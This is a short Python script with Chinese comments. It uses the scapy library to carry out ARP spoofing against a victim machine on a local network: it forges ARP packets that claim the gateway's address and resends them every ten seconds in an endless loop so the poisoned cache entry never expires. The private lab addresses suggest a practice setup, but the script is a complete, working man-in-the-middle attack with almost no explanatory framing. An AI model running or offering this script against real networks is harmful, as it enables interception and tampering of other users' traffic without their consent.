#ARP欺骗原理：https://blog.csdn.net/weibo1230123/article/details/82025746
"""
   需要使用Ether层将这个数据包发送出去,Ether数据包的格式有三个参数：dst:目的硬件地址,src:源硬件地址,
   Ether参数不填就默认设置为攻击机的硬件地址
"""

import time
from scapy.all import sendp,ARP,Ether
victimIP="192.168.169.133"#受害机
gatewayIP="192.168.169.2"#网关
packet=Ether()/ARP(psrc=gatewayIP,pdst=victimIP)
while 1:#因为ARP缓存表表项都有生命周期，所以需要写个永真循环,或写成 sendp(attackTarget,inter=1,loop=1);
   sendp(packet)
   time.sleep(10)
#使用time来延迟运行
   packet.show()